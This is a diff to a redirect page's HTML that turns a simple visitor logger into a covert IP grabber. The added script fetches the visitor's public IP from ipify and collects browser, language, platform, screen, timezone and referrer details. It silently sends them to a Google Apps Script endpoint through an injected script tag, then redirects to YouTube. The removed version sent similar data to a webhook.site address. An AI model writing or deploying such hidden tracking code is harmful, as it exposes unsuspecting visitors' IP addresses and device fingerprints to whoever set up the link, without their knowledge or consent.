@@ -8,22 +8,44 @@
     <p>You will be redirected shortly.</p>
     
     <script>
-        // Get basic visitor info
-        var visitorInfo = {
-            time: new Date().toString(),
-            page: window.location.href,
-            referrer: document.referrer,
-            browser: navigator.userAgent
-        };
+        // Function to get IP address
+        function getIP(callback) {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => callback(data.ip))
+                .catch(error => callback('Unknown'));
+        }
         
-        // Send info to a simple logger
-        var img = new Image();
-        img.src = "https://webhook.site/c015f400-dc65-4bbb-a08f-f309961c495f" + encodeURIComponent(JSON.stringify(visitorInfo));
-        
-        // Redirect after 2 seconds
-        setTimeout(function() {
-            window.location.href = "https://youtube.com";
-        }, 2000);
+        // Collect visitor info
+        getIP(function(ip) {
+            var visitorInfo = {
+                timestamp: new Date().toISOString(),
+                ip: ip,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screenResolution: screen.width + 'x' + screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                referrer: document.referrer
+            };
+            
+            // Send info to Google Sheet
+            var url = "https://script.google.com/macros/s/AKfycbzYZmiT1hDRtxCK7onmP3LJWwGEjmN4HfkEDBx70xEe-0o44llTwqGXjcsxU8XeGo-hxQ/exec";
+            var params = [];
+            
+            for (var key in visitorInfo) {
+                params.push(key + "=" + encodeURIComponent(visitorInfo[key]));
+            }
+            
+            var script = document.createElement('script');
+            script.src = url + "?" + params.join("&");
+            document.body.appendChild(script);
+            
+            // Redirect after 2 seconds
+            setTimeout(function() {
+                window.location.href = "https://youtube.com";
+            }, 2000);
+        });
     </script>
 </body>
 </html>
